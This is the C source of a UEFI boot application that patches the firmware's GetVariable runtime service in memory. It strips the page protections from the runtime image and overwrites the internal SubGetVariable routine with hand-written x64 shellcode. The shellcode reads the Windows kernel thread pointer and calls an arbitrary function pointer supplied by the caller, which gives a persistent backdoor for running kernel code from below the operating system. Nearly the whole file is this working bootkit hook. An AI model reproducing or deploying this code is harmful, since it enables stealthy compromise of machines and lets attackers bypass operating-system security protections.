#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Library/PrintLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/Cpu.h>
#include <IndustryStandard/PeImage.h>
#include <Guid/GlobalVariable.h>

#define CONTAINING_RECORD(address, type, field) ((type *)((UINT8 *)(address) - (UINTN)(&((type *)0)->field)))
#define RELATIVE_ADDR(addr, size) ((VOID *)((UINT8 *)(addr) + *(INT32 *)((UINT8 *)(addr) + ((size) - (INT32)sizeof(INT32))) + (size)))
#define Print(Text) gST->ConOut->OutputString(gST->ConOut, Text)

typedef UINTN QWORD;
typedef UINT32 DWORD;
typedef long NTSTATUS;

typedef struct _EFI_RUNTIME_ARCH_PROTOCOL EFI_RUNTIME_ARCH_PROTOCOL;

EFI_SYSTEM_TABLE *gST;
EFI_RUNTIME_SERVICES *gRT;
EFI_BOOT_SERVICES *gBS;

VOID *ResolveRelativeAddress(VOID * Instruction, DWORD OffsetOffset, DWORD InstructionSize)
{
	QWORD Instr = (QWORD)Instruction;
 
	DWORD RipOffset = *(DWORD*)(Instr + OffsetOffset);
	VOID * ResolvedAddr = (VOID *)(Instr + InstructionSize + RipOffset);
 
	return ResolvedAddr;
}

VOID MemCopy(VOID* dest, VOID* src, UINTN size)
{
	for (UINT8* d = dest, *s = src; size--; *d++ = *s++)
		;
}

inline void PressAnyKey()
{
	EFI_STATUS         Status;
	EFI_EVENT          WaitList;
	EFI_INPUT_KEY      Key;
	UINTN              Index;
	Print(L"Press F11 key to continue . . .");
	do {
		WaitList = gST->ConIn->WaitForKey;
		Status = gBS->WaitForEvent(1, &WaitList, &Index);
		gST->ConIn->ReadKeyStroke(gST->ConIn, &Key);
		if (Key.ScanCode == SCAN_F11)
			break;
	} while ( 1 );
	gST->ConOut->ClearScreen(gST->ConOut);
	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
}

#define PAGE_ALIGN(Va) ((VOID*)((QWORD)(Va) & ~(EFI_PAGE_SIZE - 1)))
EFI_CPU_ARCH_PROTOCOL* gCpu = NULL;
EFI_GUID gEfiCpuArchProtocolGuid = { 0x26BACCB1, 0x6F42, 0x11D4, { 0xBC, 0xE7, 0x00, 0x80, 0xC7, 0x3C, 0x88, 0x81 } };

EFI_STATUS EFIAPI EfiMain(IN EFI_LOADED_IMAGE* LoadedImage, IN EFI_SYSTEM_TABLE* SystemTable)
{
	gRT = SystemTable->RuntimeServices;
	gBS = SystemTable->BootServices;
	gST = SystemTable;

	if (EFI_ERROR(gBS->LocateProtocol(&gEfiCpuArchProtocolGuid, 0, &gCpu)))
	{
		return 0;
	}

	QWORD addr = (QWORD)PAGE_ALIGN(gRT->GetVariable);

	while (*(unsigned short*)addr != 0x5A4D)
	{
		addr -= 0x1000;
	}

	QWORD image_nt_header = *(DWORD*)(addr + 0x03C) + addr;
	DWORD image_size = *(DWORD*)(image_nt_header + 0x50);
	if (gCpu->SetMemoryAttributes(gCpu, addr, image_size, 0) != 0)
	{
		return 0;
	}

	unsigned char* bytes = (unsigned char*)gRT->GetVariable;
	while (1) {
		if (*bytes == 0xE8)
			break;
		bytes++;
	}

	unsigned char* SubGetVariable = RELATIVE_ADDR(bytes, 5);

	unsigned char payload[] = {
		0x40, 0x57,                                                   // rex    push rdi
		0x48, 0x83, 0xEC, 0x40,					      // sub    rsp,0x40
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,	      // mov    rax,QWORD PTR gs:0x188
		0x48, 0x85, 0xC0,					      // test   rax,rax
		0x74, 0x72,						      // je     0x86
		0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,		      // mov    rax,QWORD PTR [rax+0xb8]
		0x48, 0x8B, 0x80, 0x50, 0x05, 0x00, 0x00,		      // mov    rax,QWORD PTR [rax+0x550]
		0x48, 0x85, 0xC0,					      // test   rax,rax
		0x74, 0x5F,						      // je     0x86
		0x48, 0x8B, 0x40, 0x18,					      // mov    rax,QWORD PTR [rax+0x18]
		0x48, 0x8B, 0x78, 0x20,					      // mov    rdi,QWORD PTR [rax+0x20]
		0x48, 0x8B, 0x4F, 0x10,					      // mov    rcx,QWORD PTR [rdi+0x10]
		0x48, 0x85, 0xC9,					      // test   rcx,rcx
		0x74, 0x4E,						      // je     0x86
		0x48, 0x8B, 0x41, 0x30,					      // mov    rax,QWORD PTR [rcx+0x30]
		0x4C, 0x8B, 0x51, 0x28,					      // mov    r10,QWORD PTR [rcx+0x28]
		0x4C, 0x8B, 0x59, 0x20,					      // mov    r11,QWORD PTR [rcx+0x20]
		0x4C, 0x8B, 0x49, 0x18,					      // mov    r9,QWORD PTR [rcx+0x18]
		0x4C, 0x8B, 0x41, 0x10,					      // mov    r8,QWORD PTR [rcx+0x10]
		0x48, 0x8B, 0x51, 0x08,					      // mov    rdx,QWORD PTR [rcx+0x8]
		0x48, 0x8B, 0x09,					      // mov    rcx,QWORD PTR [rcx]
		0x48, 0x89, 0x44, 0x24, 0x30,				      // mov    QWORD PTR [rsp+0x30],rax
		0x4C, 0x89, 0x54, 0x24, 0x28,				      // mov    QWORD PTR [rsp+0x28],r10
		0x48, 0x89, 0x5C, 0x24, 0x50,				      // mov    QWORD PTR [rsp+0x50],rbx
		0x48, 0x8B, 0x5F, 0x18,					      // mov    rbx,QWORD PTR [rdi+0x18]
		0x4C, 0x89, 0x5C, 0x24, 0x20,				      // mov    QWORD PTR [rsp+0x20],r11
		0xFF, 0xD3,						      // call   rbx
		0x48, 0x8B, 0x5C, 0x24, 0x50,				      // mov    rbx,QWORD PTR [rsp+0x50]
		0x48, 0x89, 0x47, 0x18,					      // mov    QWORD PTR [rdi+0x18],rax
		0x48, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,   // movabs rax,0x800000000000000f
		0x48, 0x83, 0xC4, 0x40,					      // add    rsp,0x40
		0x5F,							      // pop    rdi
		0xC3,							      // ret
		0x33, 0xC0,						      // xor    eax,eax
		0x48, 0x83, 0xC4, 0x40,					      // add    rsp,0x40
		0x5F,							      // pop    rdi
		0xC3							      // ret
	};

	MemCopy(SubGetVariable, payload, sizeof(payload));

	Print(L"[bootx64.efi] SubGetVariable has been successfully patched\n");

	gST->ConOut->SetCursorPosition(gST->ConOut, 0, 1);

	PressAnyKey();

	return 0;
}

